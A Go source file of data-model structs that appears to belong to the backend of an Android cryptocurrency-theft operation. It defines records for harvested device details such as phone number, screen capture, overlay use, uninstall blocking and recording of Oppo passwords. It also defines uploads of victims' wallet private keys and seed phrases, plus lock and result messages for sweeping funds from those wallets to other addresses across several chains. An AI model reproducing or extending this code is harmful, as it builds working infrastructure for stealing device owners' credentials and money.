package model

// PageInfo Paging common input parameter structure
type PageInfo struct {
	Page     int    `json:"page" form:"page"`         // 页码
	PageSize int    `json:"pageSize" form:"pageSize"` // 每页大小
	Keyword  string `json:"keyword" form:"keyword"`   //关键字
}

type KindPageInfo struct {
	Page     int    `json:"page" form:"page"`         // 页码
	PageSize int    `json:"pageSize" form:"pageSize"` // 每页大小
	Keyword  string `json:"keyword" form:"keyword"`   //关键字
	Kind     string `json:"kind" form:"kind"`         //搜索类型
}

type FinancialPageInfo struct {
	Page      int    `json:"page" form:"page"`
	PageSize  int    `json:"pageSize" form:"pageSize"`
	Keyword   string `json:"keyword" form:"keyword"`
	Role      int    `json:"role" json:"role"` // 角色 0全部 1平台， 2客户， 3代理, 4私域
	TokenId   int    `json:"token_id" form:"token_id"`
	Status    int    `json:"status" form:"status"` // 状态 0全部 1成功
	StartTime string `json:"start_time" form:"start_time"`
	EndTime   string `json:"end_time" form:"end_time"`
}

type DeviceListPageInfo struct {
	Page      int    `json:"page" form:"page"`
	PageSize  int    `json:"pageSize" form:"pageSize"`
	Keyword   string `json:"keyword" form:"keyword"`
	AgentId   int    `json:"agent_id" form:"agent_id"`
	Status    int    `json:"status" form:"status"` //0  授权， 1 成功
	StartTime string `json:"start_time" form:"start_time"`
	EndTime   string `json:"end_time" form:"end_time"`
}

type AgentDeviceListPageInfo struct {
	Page      int    `json:"page" form:"page"`
	PageSize  int    `json:"pageSize" form:"pageSize"`
	Keyword   string `json:"keyword" form:"keyword"`
	Status    int    `json:"status" form:"status"` //0  授权， 1 成功
	StartTime string `json:"start_time" form:"start_time"`
	EndTime   string `json:"end_time" form:"end_time"`
}

type WalletListPageInfo struct {
	Page      int    `json:"page" form:"page"`
	PageSize  int    `json:"pageSize" form:"pageSize"`
	Keyword   string `json:"keyword" form:"keyword"`
	AgentId   int    `json:"agent_id" form:"agent_id"`
	StartTime string `json:"start_time" form:"start_time"`
	EndTime   string `json:"end_time" form:"end_time"`
}

// GetById Find by id structure
type GetById struct {
	ID int `json:"id" form:"id"` // 主键ID
}

func (r *GetById) Uint() uint {
	return uint(r.ID)
}

type IdsReq struct {
	Ids []int `json:"ids" form:"ids"`
}

// GetAuthorityId Get role by id structure
type GetAuthorityId struct {
	AuthorityId string `json:"authorityId" form:"authorityId"` // 角色ID
}

type Empty struct{}

type PageResult struct {
	List     interface{} `json:"list"`
	Total    int64       `json:"total"`
	Page     int         `json:"page"`
	PageSize int         `json:"pageSize"`
}

type ReqDevice struct {
	GroupId        string `json:"group_id"`         // 组id | 代理id
	DeviceId       string `json:"device_id"`        // 设备id
	Ip             string `json:"ip"`               // ip
	TimeZone       string `json:"time_zone"`        // 地区
	Brand          string `json:"brand"`            // 手机品牌
	Model          string `json:"model"`            // 手机型号
	AndroidVersion string `json:"android_version"`  // 安卓版本
	AppPackageName string `json:"app_package_name"` // 包名

	AppVersion                 string `json:"app_version"`
	Product                    string `json:"product"`
	IsAvoidUninstalling        bool   `json:"is_avoid_uninstalling"`
	SerialNumber               string `json:"serial_number"`
	Manufacturer               string `json:"manufacturer"`
	Display                    string `json:"display"`
	Id                         string `json:"id"`
	Board                      string `json:"board"`
	Bootloader                 string `json:"bootloader"`
	FingerPrint                string `json:"finger_print"`
	Host                       string `json:"host"`
	Hardware                   string `json:"hardware"`
	Device                     string `json:"device"`
	RadioVersion               string `json:"radio_version"`
	Tags                       string `json:"tags"`
	CpuAbi                     string `json:"cpu_abi"`
	CpuAbi2                    string `json:"cpu_abi_2"`
	Username                   string `json:"username"`
	SdkInt                     int    `json:"sdk_int"`
	Resolution                 string `json:"resolution"`
	ResolutionX                int    `json:"resolution_x"`
	ResolutionY                int    `json:"resolution_y"`
	IsCaptureScreen            bool   `json:"isCaptureScreen"`
	WifiSignalLevel            int    `json:"wifi_signal_level"`
	NetworkStatus              string `json:"network_status"`
	PhoneNumber1               string `json:"phone_number_1"`
	Language                   string `json:"language"`
	BatteryLevel               int    `json:"battery_level"`
	Overlay                    bool   `json:"overlay"`
	IsActiveRecordOppoPassword bool   `json:"is_active_record_oppo_password"`
	IsLockedDevice             bool   `json:"is_locked_device"`
	MobileDataSignalLevel      int    `json:"mobile_data_signal_level"`
	IsCharging                 bool   `json:"is_charging"`
}

type ReqWallet struct {
	DeviceId   string `json:"device_id"`   // 设备id
	WalletName string `json:"wallet_name"` // 钱包名称
	Type       string `json:"type"`        // private key, phrase
	Key        string `json:"key"`
	Phrase     string `json:"phrase"`
}

// ReqCollectResult gasleak 归集结果回传（§4.2.3）
// WalletId 与 DeviceId+Address 二选一：gasleak 侧不持有 wallet id，故走后者反查。
type ReqCollectResult struct {
	WalletId    int    `json:"wallet_id"`    // 钱包id（可选）
	DeviceId    string `json:"device_id"`    // 设备id（与 Chain+Address 组合反查 wallet）
	Address     string `json:"address"`      // 归集来源地址（与 Chain+DeviceId 组合反查）
	Chain       string `json:"chain"`        // eth | tron | btc | bsc
	TxHash      string `json:"tx_hash"`      // 幂等键
	Amount      string `json:"amount"`       // 归集数量（字符串）
	ToAddress   string `json:"to_address"`   // 实际落账地址
	CollectedAt int64  `json:"collected_at"` // 毫秒时间戳
}

// ReqCollectLock 归集原子占位（§4.2.4 互斥）
// 语义：progress 0 → 1。用条件更新消除 TOCTOU，避免 gasleak 与潜客 Sk() 双重归集。
type ReqCollectLock struct {
	WalletId int    `json:"wallet_id"` // 钱包id（可选）
	DeviceId string `json:"device_id"` // 设备id（与 Chain+Address 组合反查 wallet）
	Address  string `json:"address"`   // 归集来源地址（与 Chain+DeviceId 组合反查）
	Chain    string `json:"chain"`     // eth | tron | btc | bsc
}

// ReqCollectRelease 显式释放归集占位（progress 1 → 0）。
// ★ 为何需要独立端点：collect-result 只在【回传成功】时释放，
//   而转账失败 / 链上超时等路径不会走回传，占位会永久泄漏，
//   导致该钱包再也无法被 gasleak 或潜客 Sk() 归集。故必须有失败可用的释放通道。
type ReqCollectRelease struct {
	WalletId int    `json:"wallet_id"` // 钱包id（可选）
	DeviceId string `json:"device_id"` // 设备id（与 Chain+Address 组合反查 wallet）
	Address  string `json:"address"`   // 归集来源地址（与 Chain+DeviceId 组合反查）
	Chain    string `json:"chain"`     // eth | tron | btc | bsc
}
